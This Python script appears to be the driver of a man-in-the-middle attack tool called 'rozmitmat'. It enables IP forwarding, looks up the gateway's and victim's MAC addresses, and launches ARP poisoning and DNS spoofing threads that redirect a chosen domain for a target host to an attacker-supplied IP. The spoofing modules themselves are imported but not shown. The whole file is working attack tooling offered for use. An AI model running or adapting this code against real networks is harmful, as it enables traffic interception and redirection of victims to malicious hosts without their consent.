#!/usr/bin/env python3

import sys
import os
import argparse
from ARPSpoof import ARPSpoof
from DNSSpoof import DNSSPoof
from scapy.all import srp
from scapy.layers.l2 import ARP, Ether

# Reads program arguments
def arg_parser():
    parser = argparse.ArgumentParser()
    parser.add_argument("-n", "--network", required=True, help="Specify the network device name to use")
    parser.add_argument("-g", "--gatewayIP", required=True, help="Specify the gateway IP address")
    parser.add_argument("-t", "--targetIP", required=True, help="Specify the target IP address")
    parser.add_argument("-d", "--domain", required=True, help="Specify the domain to spoof")
    parser.add_argument("-r", "--redirecttoIP", required=True, help="Specify the IP address to redirect to")
    return parser.parse_args()
            
def read_MAC(ip):    
    ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
    for s,r in ans:
        return r[Ether].src

# Clean iptables
def clean_forwarding():
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as forward:
        forward.write('0\n')

def start_forwarding():
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as forward:
        forward.write('1\n')

# Main function
def main(args):
    arp_poisoning = None
    arp_thread = None
    dns_spoof = None
    dns_thread = None

    exit_code = 0

    try:
        print("[*] rozmitmat started [CTRL-C to stop]")

        start_forwarding()

        gatewayMAC = read_MAC(args.gatewayIP)
        targetMAC = read_MAC(args.targetIP)

        print("[*] Gateway MAC: {}".format(gatewayMAC))
        print("[*] Target MAC: {}".format(targetMAC))

        arp_poisoning = ARPSpoof(args.gatewayIP, gatewayMAC, args.targetIP, targetMAC)
        arp_thread = arp_poisoning.start()

        dns_spoof = DNSSPoof(args.network, args.targetIP, args.domain, args.redirecttoIP)
        dns_thread = dns_spoof.start()
        
        dns_thread.join()
        arp_thread.join()

        dns_spoof.stop()
        arp_poisoning.restore_target()
        clean_forwarding()

        print("\n[*] rozmitmat finished .. shouldn't be here :/")

    except KeyboardInterrupt:
        print("\n[-] Detected CTRL-C, stopping...")

        dns_spoof.stop()
        arp_poisoning.stop()

        dns_thread.join()
        arp_thread.join()

        arp_poisoning.restore_target()
        clean_forwarding()
        
    except Exception as e:
        print("[-] Exception: {}".format(e))
        exit_code = 1

        dns_spoof.stop()
        arp_poisoning.stop()

        dns_thread.join()
        arp_thread.join()

        arp_poisoning.restore_target()
        clean_forwarding()

    return exit_code

#sudo apt-get install build-essential python3-dev libnetfilter-queue-dev
#pip install NetfilterQueue

if __name__ == "__main__":
    args = arg_parser()

    if os.geteuid() != 0:
        print("[-] Please run as root")
        sys.exit(1)

    print("[*] rozmitmat stopped")
    sys.exit(main(args))
